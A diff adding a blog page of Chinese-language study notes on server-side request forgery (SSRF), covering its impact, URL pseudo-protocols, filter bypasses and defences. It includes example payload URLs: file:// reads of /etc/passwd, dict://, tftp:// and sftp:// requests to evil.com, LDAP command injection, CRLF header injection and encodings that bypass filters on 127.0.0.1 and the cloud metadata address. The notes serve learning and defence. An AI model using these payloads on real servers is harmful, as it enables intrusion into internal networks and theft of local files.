@@ -1,0 +1,246 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ssrf | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SSRF概念SSRF((Server-Side Request Forgery,服务器端请求伪造) 服务器因传参偷发数据包。SSRF攻击的目标是从外网无法访问的内部系统（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。攻击者伪造服务端的请求发起攻击，借由服务端为跳板来攻击目标系统。 SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssrf">
+<meta property="og:url" content="http://example.com/2024/09/29/ssrf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SSRF概念SSRF((Server-Side Request Forgery,服务器端请求伪造) 服务器因传参偷发数据包。SSRF攻击的目标是从外网无法访问的内部系统（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。攻击者伪造服务端的请求发起攻击，借由服务端为跳板来攻击目标系统。 SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-09-29T15:00:31.000Z">
+<meta property="article:modified_time" content="2024-09-29T15:06:24.782Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/09/29/ssrf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ssrf',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-29 23:06:24'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ssrf</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-09-29T15:00:31.000Z" title="Created 2024-09-29 23:00:31">2024-09-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-29T15:06:24.782Z" title="Updated 2024-09-29 23:06:24">2024-09-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ssrf"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SSRF概念"><a href="#SSRF概念" class="headerlink" title="SSRF概念"></a>SSRF概念</h1><p>SSRF((Server-Side Request Forgery,服务器端请求伪造) 服务器因传参偷发数据包。SSRF攻击的目标是从外网无法访问的内部系统（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。攻击者伪造服务端的请求发起攻击，借由服务端为跳板来攻击目标系统。</p>
+<p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
+<p>CSRF –跨站&#x2F;客户端请求伪造 浏览器因js偷发数据包</p>
+<p>翻译软件</p>
+<p>单词： post&#x2F;get传参 数据库查询</p>
+<p>翻译网页：(两种情况)</p>
+<p>1.用户访问目标站点，翻译网页网站通过js获取用户页面显示信息，传递给翻译网页查询(难)</p>
+<p>2.翻译网站直接替代用户访问目标站点，获得内容后查询英文对应，处理完返回给用户(典型ssrf)</p>
+<p> 通过查看外网的ip判断是哪种方式</p>
+<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>1.内外网的端口和服务扫描  dict:&#x2F;&#x2F;</p>
+<p>2.攻击运行在内网或本地的应用程序</p>
+<p>mysql -h 主机地址 -u 用户名 -p 用户密码 </p>
+<p>–如果端口未开放，访问不到  存在ssrf，访问本地，可(本地对本地)</p>
+<p>有些网站对127.0.0.1不设防 waf(不拦截ssrf攻击)</p>
+<p>3.对内网web应用进行指纹识别，识别企业内部的资产信息</p>
+<p>4.攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）</p>
+<p>5.利用file协议读取本地敏感数据文件等   file:&#x2F;&#x2F; </p>
+<p>核心：通过ssrf穿越防火墙攻击内网</p>
+<p>证明是否有ssrf:（能访问内网、主机）</p>
+<p>1.传参有url&#x3D;或http:&#x2F;&#x2F; https:&#x2F;&#x2F;</p>
+<p>2.网站访问链接确保能够发起请求(看dns平台是否有记录)</p>
+<p>dns平台：dnslog.cn  (要有外网  没有外网的内网机器 —&gt; 上所有内网地址强扫)</p>
+<p>项目上：能发起请求就属于漏洞（功能除外）</p>
+<p>注：</p>
+<p>127.0.0.1:81 当前存在ssrf漏洞主机的81端口</p>
+<p>域名：81 域名对应ip的81端口</p>
+<p>公网ip&#x3D;&gt;多个主机</p>
+<h1 id="url伪协议"><a href="#url伪协议" class="headerlink" title="url伪协议"></a>url伪协议</h1><p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：</p>
+<p>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</p>
+<p>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议<br>ldap:&#x2F;&#x2F; 轻量级目录访问协议<br>tftp:&#x2F;&#x2F; 简单文件传输协议</p>
+<p>1.<strong>file:&#x2F;&#x2F;</strong> 获取文件内容</p>
+<p><a href="http://example.com/?url=file://%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">http://example.com?url=file://文件路径</a></p>
+<p>2.<strong>dict:&#x2F;&#x2F;</strong>  探测端口</p>
+<p><a href="http://example.com/ssrf.php?dict://evil.com:1337/">http://example.com/ssrf.php?dict://evil.com:1337/</a></p>
+<p><strong>3.gopher:&#x2F;&#x2F;</strong></p>
+<p><strong>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</strong></p>
+<p>gopher协议：可以发起tcp数据流</p>
+<p>TCP:TCP（Transmission Control Protocol，传输控制协议）是面向连接的协议，也就是说，在收发数据前，必须和对方建立可靠的连接。 一个TCP连接必须要经过三次“对话”才能建立起来。</p>
+<p>UDP:（User Data Protocol，用户数据报协议）是一个非连接的协议，传输数据之前源端和终端不建立连接。</p>
+<p><strong>存在SSRF漏洞且内网中Redis服务可以未授权访问</strong>  ##</p>
+<p>redis 缓存数据库 (默认无密码 外网访问不到) 如果存在ssrf，可以攻击</p>
+<p>gopher:&#x2F;&#x2F;host:port&#x2F;</p>
+<p>读：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/303275.html">https://www.freebuf.com/articles/web/303275.html</a>  </p>
+<p>4、<strong>ldap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;</strong>  ##</p>
+<p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p>
+<p><a href="http://example.com/ssrf.php?url=ldap://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</a></p>
+<p><a href="http://example.com/ssrf.php?url=ldaps://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</a></p>
+<p><a href="http://example.com/ssrf.php?url=ldapi://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</a></p>
+<p>5、<strong>tftp:&#x2F;&#x2F;</strong></p>
+<p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<p><a href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a></p>
+<p>6、<strong>sftp：&#x2F;&#x2F;</strong>  ##</p>
+<p>Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<p><a href="http://example.com/ssrf.php?url=sftp://evil.com:1337/">http://example.com/ssrf.php?url=sftp://evil.com:1337/</a></p>
+<h1 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h1><p>127.0.0.1内网地址</p>
+<p>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。需要对请求的参数地址做相关的绕过处理.</p>
+<h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><p>1.<strong>限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时，利用@</strong></p>
+<p><a target="_blank" rel="noopener" href="http://www.baidu.com@127.0.0.1/">http://www.baidu.com@127.0.0.1</a></p>
+<p>2.<strong>纯数字ip地址或短网址绕过(有在线工具)</strong></p>
+<p><a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> &#x3D;&gt; <a target="_blank" rel="noopener" href="http://z6b.cn/rrlOk">http://z6b.cn/rrlOk</a></p>
+<p><a href="http://www.baidu.com=>3026531058/">www.baidu.com=&gt;3026531058</a></p>
+<p>3.<strong>进制转换</strong></p>
+<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
+<p>4.<strong>特殊域名</strong> </p>
+<p>原理dns解析</p>
+<p>.xip.io不行 找找其它的</p>
+<p>5.<strong>利用[::]</strong></p>
+<p>绕过localhost</p>
+<p><a href="http://180.101.50.242>>http//[::180.101.50.242]">http://180.101.50.242&gt;&gt;http://[::180.101.50.242]</a>   ##没试出来</p>
+<p>6.<strong>利用 。</strong></p>
+<p>180.101.50.242  &#x3D;&gt;   180。101。50。242</p>
+<p>7、<strong>CRLF 编码绕过</strong></p>
+<blockquote>
+<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
+</blockquote>
+<p>example.com&#x2F;?url&#x3D;<a href="http://eval.com%0d%0aHOST:fuzz.com%0d%0a">http://eval.com%0d%0aHOST:fuzz.com%0d%0a</a> </p>
+<p>8.<strong>利用封闭的字母数字</strong><br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br><a href="http://169.254.169.254>>>http//[::%E2%91%A0%E2%91%A5%E2%91%A8%EF%BD%A1%E2%91%A1%E2%91%A4%E2%91%A3%EF%BD%A1%E2%91%AF%E2%91%A8%EF%BD%A1%E2%91%A1%E2%91%A4%E2%91%A3]">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</a><br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p>
+<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名，利用@</p>
+<p>2.限制请求IP不为内网地址</p>
+<p>（1）采取短网址、纯数字ip绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
+<p>3.限制请求只为http协议</p>
+<p>（1）采取302跳转<br>（2）采取短地址</p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
+<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
+<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/124050308">https://blog.csdn.net/qq_43378996/article/details/124050308</a></p>
+<p>待读：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/miruier/p/13907150.html">https://www.cnblogs.com/miruier/p/13907150.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/303275.html">https://www.freebuf.com/articles/web/303275.html</a>   </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/09/29/ssrf/">http://example.com/2024/09/29/ssrf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/29/XXE/" title="XXE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">XXE</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/29/%E9%9D%B6%E5%9C%BAgogogo/" title="靶场gogogo"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">靶场gogogo</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">SSRF概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.</span> <span class="toc-text">url伪协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">常见绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6"><span class="toc-number">4.2.</span> <span class="toc-text">限制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">防御</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/29/%E6%94%AF%E4%BB%98%E3%80%81%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" title="支付、越权漏洞">支付、越权漏洞</a><time datetime="2024-09-29T15:02:16.000Z" title="Created 2024-09-29 23:02:16">2024-09-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/29/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="任意文件包含漏洞">任意文件包含漏洞</a><time datetime="2024-09-29T15:02:00.000Z" title="Created 2024-09-29 23:02:00">2024-09-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/29/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="代码执行漏洞">代码执行漏洞</a><time datetime="2024-09-29T15:01:18.000Z" title="Created 2024-09-29 23:01:18">2024-09-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/29/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" title="变量覆盖漏洞">变量覆盖漏洞</a><time datetime="2024-09-29T15:01:04.000Z" title="Created 2024-09-29 23:01:04">2024-09-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/29/XXE/" title="XXE">XXE</a><time datetime="2024-09-29T15:00:39.000Z" title="Created 2024-09-29 23:00:39">2024-09-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
